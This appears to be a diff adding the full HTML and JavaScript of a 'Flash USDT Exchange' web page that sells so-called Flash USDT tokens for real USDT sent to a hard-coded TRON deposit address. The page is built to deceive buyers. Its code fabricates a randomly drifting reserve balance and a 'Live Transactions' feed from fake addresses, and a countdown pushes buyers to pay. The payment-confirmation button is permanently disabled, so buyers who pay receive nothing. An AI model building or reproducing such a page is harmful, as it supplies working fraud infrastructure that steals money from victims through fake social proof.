@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flash USDT Exchange - Professional Trading Platform</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
+        body { 
+            font-family: 'Inter', sans-serif;
+            background: #0f0f1e;
+            color: #e0e0e0;
+        }
+        .gradient-bg { 
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+        }
+        .glass-effect { 
+            backdrop-filter: blur(10px); 
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .card-bg {
+            background: rgba(30, 30, 45, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+        }
+        .neon-glow {
+            box-shadow: 0 0 20px rgba(102, 126, 234, 0.5);
+        }
+        .animate-pulse-slow { 
+            animation: pulse 3s cubic-bezier(0.4, 0, 0.6, 1) infinite; 
+        }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .8; } }
+        .transaction-card {
+            transition: all 0.3s ease;
+            animation: slideIn 0.5s ease-out;
+        }
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .transaction-card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
+        }
+        .copy-feedback { 
+            animation: fadeInOut 2s ease-in-out; 
+        }
+        @keyframes fadeInOut { 0% { opacity: 0; } 50% { opacity: 1; } 100% { opacity: 0; } }
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            transition: all 0.3s ease;
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
+        }
+        .btn-primary:disabled {
+            background: linear-gradient(135deg, #4a5568 0%, #2d3748 100%);
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        .input-field {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+        }
+        .input-field:focus {
+            background: rgba(255, 255, 255, 0.08);
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2);
+        }
+        .footer-nav {
+            background: rgba(15, 15, 30, 0.95);
+            backdrop-filter: blur(10px);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .special-offer {
+            background: linear-gradient(135deg, #f59e0b 0%, #ef4444 100%);
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        @keyframes glow {
+            from { box-shadow: 0 0 10px rgba(245, 158, 11, 0.5); }
+            to { box-shadow: 0 0 20px rgba(245, 158, 11, 0.8); }
+        }
+        .countdown-warning {
+            animation: blink 1s ease-in-out infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .progress-ring {
+            transform: rotate(-90deg);
+        }
+        .progress-ring-circle {
+            transition: stroke-dashoffset 0.35s;
+            stroke: #667eea;
+            stroke-width: 4;
+            fill: transparent;
+        }
+        .waiting-animation {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #ffffff;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="gradient-bg min-h-screen">
+    <div class="max-w-md mx-auto min-h-screen relative">
+        <!-- Header -->
+        <header class="p-6 pb-8">
+            <div class="flex justify-between items-center mb-6">
+                <div class="flex items-center space-x-3">
+                    <div class="w-12 h-12 rounded-full bg-gradient-to-r from-purple-600 to-indigo-600 flex items-center justify-center">
+                        <i class="fas fa-bolt text-white text-xl"></i>
+                    </div>
+                    <div>
+                        <h1 class="text-2xl font-bold text-white">Flash USDT</h1>
+                        <p class="text-xs text-gray-400">Professional Exchange</p>
+                    </div>
+                </div>
+                <div class="flex items-center space-x-2">
+                    <div class="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
+                    <span class="text-xs text-green-400 font-medium">LIVE</span>
+                </div>
+            </div>
+            
+            <div class="glass-effect rounded-2xl p-5 mb-5">
+                <div class="flex justify-between items-center">
+                    <div>
+                        <p class="text-sm text-gray-400 mb-1">Total Reserved</p>
+                        <p class="text-2xl font-bold text-white" id="totalReserved">74,132,154.310147</p>
+                        <p class="text-xs text-gray-500 mt-1">Flash USDT</p>
+                    </div>
+                    <div class="text-right">
+                        <div class="bg-green-900/30 text-green-400 px-3 py-1 rounded-full text-xs font-medium mb-2">
+                            <i class="fas fa-arrow-up mr-1"></i>
+                            +2.5%
+                        </div>
+                        <p class="text-xs text-gray-500">24h Change</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="special-offer rounded-2xl p-5 text-white">
+                <div class="flex items-center justify-between">
+                    <div>
+                        <p class="text-lg font-bold mb-1">🔥 Special Offer</p>
+                        <p class="text-sm opacity-90">0.003 USDT per Flash USDT</p>
+                        <p class="text-xs opacity-75 mt-1">Limited Time Only</p>
+                    </div>
+                    <i class="fas fa-fire text-3xl text-white/80"></i>
+                </div>
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <main class="px-6 pb-24">
+            <!-- Buy Form -->
+            <section class="card-bg rounded-2xl p-6 mb-6">
+                <div class="flex items-center justify-between mb-5">
+                    <h2 class="text-xl font-bold text-white flex items-center">
+                        <i class="fas fa-shopping-cart text-purple-400 mr-2"></i>
+                        Buy Flash USDT
+                    </h2>
+                    <span class="text-xs bg-purple-900/30 text-purple-400 px-2 py-1 rounded-full">Instant</span>
+                </div>
+                
+                <form id="buyForm" class="space-y-4">
+                    <div>
+                        <label class="block text-sm font-medium text-gray-300 mb-2">Email Address</label>
+                        <div class="relative">
+                            <i class="fas fa-envelope absolute left-3 top-3.5 text-gray-500"></i>
+                            <input type="email" id="email" required class="input-field w-full pl-10 pr-4 py-3 rounded-lg text-white placeholder-gray-500 focus:outline-none" placeholder="your@email.com">
+                        </div>
+                    </div>
+                    
+                    <div>
+                        <label class="block text-sm font-medium text-gray-300 mb-2">USDT TRC20 Address</label>
+                        <div class="relative">
+                            <i class="fas fa-wallet absolute left-3 top-3.5 text-gray-500"></i>
+                            <input type="text" id="usdtAddress" required class="input-field w-full pl-10 pr-4 py-3 rounded-lg text-white placeholder-gray-500 focus:outline-none" placeholder="Txxxxxxxxxxxxxxxxxxxxxxxxxx">
+                        </div>
+                    </div>
+                    
+                    <div>
+                        <label class="block text-sm font-medium text-gray-300 mb-2">Amount (Flash USDT)</label>
+                        <div class="relative">
+                            <i class="fas fa-coins absolute left-3 top-3.5 text-gray-500"></i>
+                            <input type="number" id="amount" min="2500" step="0.000001" required class="input-field w-full pl-10 pr-4 py-3 rounded-lg text-white placeholder-gray-500 focus:outline-none" placeholder="2500">
+                        </div>
+                        <p class="text-xs text-gray-500 mt-1">Minimum: 2,500 Flash USDT</p>
+                    </div>
+                    
+                    <div class="glass-effect rounded-xl p-4">
+                        <div class="flex justify-between mb-2">
+                            <span class="text-sm text-gray-400">Price per Flash USDT:</span>
+                            <span class="font-semibold text-yellow-400" id="pricePerUnit">0.003 USDT</span>
+                        </div>
+                        <div class="flex justify-between">
+                            <span class="text-sm text-gray-400">Total Cost:</span>
+                            <span class="font-bold text-xl text-purple-400" id="totalCost">0 USDT</span>
+                        </div>
+                    </div>
+                    
+                    <button type="submit" class="btn-primary w-full text-white font-bold py-3.5 rounded-lg flex items-center justify-center space-x-2">
+                        <i class="fas fa-bolt"></i>
+                        <span>Buy Flash USDT</span>
+                    </button>
+                </form>
+            </section>
+
+            <!-- Recent Transactions -->
+            <section class="card-bg rounded-2xl p-6">
+                <div class="flex items-center justify-between mb-5">
+                    <h2 class="text-xl font-bold text-white flex items-center">
+                        <i class="fas fa-history text-blue-400 mr-2"></i>
+                        Live Transactions
+                    </h2>
+                    <div class="flex items-center space-x-1">
+                        <div class="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
+                        <span class="text-xs text-gray-400">Live</span>
+                    </div>
+                </div>
+                <div id="transactionsList" class="space-y-3">
+                    <!-- Transactions will be added here by JavaScript -->
+                </div>
+            </section>
+        </main>
+
+        <!-- Footer Navigation -->
+        <footer class="footer-nav fixed bottom-0 left-0 right-0 max-w-md mx-auto">
+            <div class="flex justify-around py-3">
+                <a href="#" class="flex flex-col items-center text-purple-400">
+                    <i class="fas fa-home text-xl mb-1"></i>
+                    <span class="text-xs">Home</span>
+                </a>
+                <a href="#" class="flex flex-col items-center text-gray-500">
+                    <i class="fas fa-exchange-alt text-xl mb-1"></i>
+                    <span class="text-xs">Exchange</span>
+                </a>
+                <a href="#" class="flex flex-col items-center text-gray-500">
+                    <i class="fas fa-wallet text-xl mb-1"></i>
+                    <span class="text-xs">Wallet</span>
+                </a>
+                <a href="#" class="flex flex-col items-center text-gray-500">
+                    <i class="fas fa-user text-xl mb-1"></i>
+                    <span class="text-xs">Profile</span>
+                </a>
+            </div>
+        </footer>
+
+        <!-- WhatsApp Support -->
+        <a href="https://wa.me/1234567890" target="_blank" class="fixed bottom-20 right-4 bg-green-500 hover:bg-green-600 text-white p-4 rounded-full shadow-lg transition transform hover:scale-110 z-10">
+            <i class="fab fa-whatsapp text-xl"></i>
+        </a>
+
+        <!-- Payment Modal -->
+        <div id="paymentModal" class="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center p-4 z-50 hidden">
+            <div class="card-bg rounded-2xl shadow-2xl max-w-md w-full p-6">
+                <div class="flex justify-between items-center mb-6">
+                    <h3 class="text-xl font-bold text-white">Payment Details</h3>
+                    <button id="closeModal" class="text-gray-400 hover:text-white">
+                        <i class="fas fa-times text-xl"></i>
+                    </button>
+                </div>
+                
+                <!-- Countdown Timer -->
+                <div class="glass-effect rounded-xl p-4 mb-6">
+                    <div class="flex items-center justify-between mb-3">
+                        <span class="text-sm text-gray-300">Payment Time Remaining</span>
+                        <div class="flex items-center space-x-2">
+                            <svg class="progress-ring" width="40" height="40">
+                                <circle class="progress-ring-circle" stroke="#667eea" stroke-width="4" fill="transparent" r="16" cx="20" cy="20"></circle>
+                            </svg>
+                            <span id="countdown" class="text-lg font-bold text-purple-400">60:00</span>
+                        </div>
+                    </div>
+                    <div class="w-full bg-gray-700 rounded-full h-2">
+                        <div id="progressBar" class="bg-gradient-to-r from-purple-600 to-indigo-600 h-2 rounded-full transition-all duration-1000" style="width: 100%"></div>
+                    </div>
+                    <p class="text-xs text-gray-500 mt-2">Complete payment within 60 minutes or the trade will be canceled</p>
+                </div>
+                
+                <div class="text-center mb-6">
+                    <p class="text-gray-300 mb-3">Send exactly <span id="paymentAmount" class="font-bold text-lg text-purple-400">0</span> USDT (TRC20) to:</p>
+                    <div class="glass-effect rounded-xl p-4 mb-4 relative">
+                        <p class="font-mono text-sm text-white break-all pr-12" id="depositAddress">TMy5cLdGz3G8HrWG1yndLagH1w7tQQCN7p</p>
+                        <button id="copyAddressBtn" class="absolute right-3 top-1/2 transform -translate-y-1/2 text-purple-400 hover:text-purple-300">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                        <div id="copyFeedback" class="absolute right-3 top-1/2 transform -translate-y-1/2 text-green-400 hidden">
+                            <i class="fas fa-check"></i>
+                        </div>
+                    </div>
+                    
+                    <div class="flex justify-center mb-4">
+                        <div id="qrcode" class="p-3 bg-white rounded-xl border border-gray-700"></div>
+                    </div>
+                    
+                    <p class="text-sm text-gray-400">Scan with your TRON wallet</p>
+                </div>
+                
+                <div class="bg-red-900/20 border border-red-800/50 rounded-xl p-4 mb-4">
+                    <p class="text-sm text-red-400">
+                        <i class="fas fa-exclamation-triangle mr-2"></i>
+                        Only send USDT on TRC20 network. Other networks may result in loss of funds.
+                    </p>
+                </div>
+                
+                <button id="confirmPayment" class="btn-primary w-full text-white font-bold py-3.5 rounded-lg mb-3 flex items-center justify-center" disabled>
+                    <span class="waiting-animation"></span>
+                    <span>Wait for payment</span>
+                </button>
+                
+                <button id="cancelTrade" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-3.5 rounded-lg transition">
+                    Cancel Trade
+                </button>
+            </div>
+        </div>
+
+        <!-- Trade Canceled Modal -->
+        <div id="canceledModal" class="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center p-4 z-50 hidden">
+            <div class="card-bg rounded-2xl shadow-2xl max-w-md w-full p-6 text-center">
+                <div class="w-16 h-16 bg-red-600 rounded-full flex items-center justify-center mx-auto mb-4">
+                    <i class="fas fa-times text-white text-2xl"></i>
+                </div>
+                <h3 class="text-xl font-bold text-white mb-2">Trade Canceled</h3>
+                <p class="text-gray-300 mb-6">The payment time has expired. Your trade has been automatically canceled.</p>
+                <button id="closeCanceledModal" class="btn-primary w-full text-white font-bold py-3.5 rounded-lg">
+                    Close
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Elements
+            const totalReservedEl = document.getElementById('totalReserved');
+            const buyForm = document.getElementById('buyForm');
+            const amountInput = document.getElementById('amount');
+            const totalCostEl = document.getElementById('totalCost');
+            const pricePerUnitEl = document.getElementById('pricePerUnit');
+            const paymentModal = document.getElementById('paymentModal');
+            const canceledModal = document.getElementById('canceledModal');
+            const paymentAmountEl = document.getElementById('paymentAmount');
+            const closeModalBtn = document.getElementById('closeModal');
+            const closeCanceledModalBtn = document.getElementById('closeCanceledModal');
+            const confirmPaymentBtn = document.getElementById('confirmPayment');
+            const cancelTradeBtn = document.getElementById('cancelTrade');
+            const copyAddressBtn = document.getElementById('copyAddressBtn');
+            const copyFeedback = document.getElementById('copyFeedback');
+            const depositAddressEl = document.getElementById('depositAddress');
+            const transactionsList = document.getElementById('transactionsList');
+            const countdownEl = document.getElementById('countdown');
+            const progressBarEl = document.getElementById('progressBar');
+            
+            // Constants
+            const specialRate = 0.003;
+            const depositAddress = "TMy5cLdGz3G8HrWG1yndLagH1w7tQQCN7p";
+            const PAYMENT_TIMEOUT = 60 * 60 * 1000; // 60 minutes in milliseconds
+            
+            // Timer variables
+            let paymentTimer = null;
+            let paymentStartTime = null;
+            let countdownInterval = null;
+            
+            // Pool of USDT addresses for transactions
+            const addressPool = [
+                'TMy5cLdGz3G8HrWG1yndLagH1w7tQQCN7p',
+                'TQn9Y2khN7y8XJ3L4K5M6P7Q8R9S0T1U2',
+                'TA3B4C5D6E7F8G9H0I1J2K3L4M5N6O7P8',
+                'TR9S8T7U6V5W4X3Y2Z1A2B3C4D5E6F7G8',
+                'TN1M2N3O4P5Q6R7S8T9U0V1W2X3Y4Z5A6',
+                'TX7Y6Z5A4B3C2D1E0F9G8H7I6J5K4L3M2',
+                'TP8O9N0M1L2K3J4I5H6G7F8E9D0C1B2A3',
+                'TZ4A3B2C1D0E9F8G7H6I5J4K3L2M1N0O9',
+                'TY5B6C7D8E9F0G1H2I3J4K5L6M7N8O9P0',
+                'TW1P2O3N4M5L6K7J8I9H0G1F2E3D4C5B6'
+            ];
+            
+            // Update total reserved every second
+            let totalReserved = 74132154.310147;
+            setInterval(() => {
+                const change = (Math.random() - 0.5) * 100;
+                totalReserved += change;
+                totalReservedEl.textContent = totalReserved.toLocaleString('en-US', { minimumFractionDigits: 6, maximumFractionDigits: 6 });
+            }, 1000);
+            
+            // Calculate total cost when amount changes
+            amountInput.addEventListener('input', function() {
+                const amount = parseFloat(this.value) || 0;
+                const total = amount * specialRate;
+                totalCostEl.textContent = `${total.toFixed(6)} USDT`;
+            });
+            
+            // Handle form submission
+            buyForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const amount = parseFloat(amountInput.value);
+                const total = amount * specialRate;
+                showPaymentModal(total);
+            });
+            
+            // Show payment modal
+            function showPaymentModal(amount) {
+                paymentAmountEl.textContent = amount.toFixed(6);
+                paymentModal.classList.remove('hidden');
+                
+                // Generate QR code
+                const qrcodeContainer = document.getElementById('qrcode');
+                qrcodeContainer.innerHTML = '';
+                new QRCode(qrcodeContainer, {
+                    text: depositAddress,
+                    width: 160,
+                    height: 160,
+                    colorDark: "#000000",
+                    colorLight: "#ffffff",
+                    correctLevel: QRCode.CorrectLevel.H
+                });
+                
+                // Start payment timer
+                startPaymentTimer();
+            }
+            
+            // Start payment countdown timer
+            function startPaymentTimer() {
+                paymentStartTime = Date.now();
+                
+                // Clear any existing intervals
+                if (countdownInterval) {
+                    clearInterval(countdownInterval);
+                }
+                
+                // Update countdown every second
+                countdownInterval = setInterval(updateCountdown, 1000);
+                updateCountdown(); // Initial update
+                
+                // Set timeout for auto-cancel
+                paymentTimer = setTimeout(() => {
+                    cancelPayment();
+                }, PAYMENT_TIMEOUT);
+            }
+            
+            // Update countdown display
+            function updateCountdown() {
+                const elapsed = Date.now() - paymentStartTime;
+                const remaining = Math.max(0, PAYMENT_TIMEOUT - elapsed);
+                
+                if (remaining === 0) {
+                    clearInterval(countdownInterval);
+                    return;
+                }
+                
+                const minutes = Math.floor(remaining / 60000);
+                const seconds = Math.floor((remaining % 60000) / 1000);
+                
+                countdownEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                // Update progress bar
+                const progress = (remaining / PAYMENT_TIMEOUT) * 100;
+                progressBarEl.style.width = `${progress}%`;
+                
+                // Add warning class when less than 5 minutes
+                if (remaining < 5 * 60 * 1000) {
+                    countdownEl.classList.add('countdown-warning', 'text-red-400');
+                } else {
+                    countdownEl.classList.remove('countdown-warning', 'text-red-400');
+                }
+            }
+            
+            // Cancel payment
+            function cancelPayment() {
+                clearInterval(countdownInterval);
+                clearTimeout(paymentTimer);
+                paymentModal.classList.add('hidden');
+                canceledModal.classList.remove('hidden');
+            }
+            
+            // Copy address functionality
+            copyAddressBtn.addEventListener('click', function() {
+                navigator.clipboard.writeText(depositAddress).then(() => {
+                    copyAddressBtn.classList.add('hidden');
+                    copyFeedback.classList.remove('hidden');
+                    
+                    setTimeout(() => {
+                        copyAddressBtn.classList.remove('hidden');
+                        copyFeedback.classList.add('hidden');
+                    }, 2000);
+                });
+            });
+            
+            // Close modal
+            closeModalBtn.addEventListener('click', function() {
+                clearInterval(countdownInterval);
+                clearTimeout(paymentTimer);
+                paymentModal.classList.add('hidden');
+            });
+            
+            closeCanceledModalBtn.addEventListener('click', function() {
+                canceledModal.classList.add('hidden');
+            });
+            
+            // Confirm payment button is disabled and non-clickable
+            // No event listener needed as it's disabled
+            
+            cancelTradeBtn.addEventListener('click', function() {
+                cancelPayment();
+            });
+            
+            // Generate fake transactions with random addresses
+            function generateFakeTransactions() {
+                const transactions = [];
+                
+                for (let i = 0; i < 5; i++) {
+                    // Pick a random address from the pool
+                    const address = addressPool[Math.floor(Math.random() * addressPool.length)];
+                    const block = Math.floor(Math.random() * 1000000);
+                    const time = new Date(Date.now() - Math.floor(Math.random() * 3600000)).toLocaleTimeString();
+                    
+                    transactions.push({ address, block, time });
+                }
+                
+                return transactions;
+            }
+            
+            function displayTransactions() {
+                const transactions = generateFakeTransactions();
+                transactionsList.innerHTML = '';
+                
+                transactions.forEach((tx, index) => {
+                    const txEl = document.createElement('div');
+                    txEl.className = 'transaction-card glass-effect rounded-xl p-4 border border-gray-700';
+                    txEl.style.animationDelay = `${index * 0.1}s`;
+                    
+                    // Truncate address for display
+                    const truncatedAddress = tx.address.substring(0, 8) + '...' + tx.address.substring(tx.address.length - 8);
+                    
+                    txEl.innerHTML = `
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center">
+                                <div class="w-10 h-10 rounded-full bg-gradient-to-r from-blue-600 to-purple-600 flex items-center justify-center mr-3">
+                                    <i class="fas fa-link text-white text-sm"></i>
+                                </div>
+                                <div>
+                                    <p class="font-medium font-mono text-sm text-white">${truncatedAddress}</p>
+                                    <p class="text-xs text-gray-500">Block: ${tx.block}</p>
+                                </div>
+                            </div>
+                            <div class="text-right">
+                                <p class="text-xs text-gray-400">${tx.time}</p>
+                                <div class="flex items-center mt-1">
+                                    <div class="w-1.5 h-1.5 bg-green-400 rounded-full mr-1"></div>
+                                    <span class="text-xs text-green-400">Confirmed</span>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                    transactionsList.appendChild(txEl);
+                });
+            }
+            
+            // Initial display and update every 3 seconds
+            displayTransactions();
+            setInterval(displayTransactions, 3000);
+        });
+    </script>
+</body>
+</html>
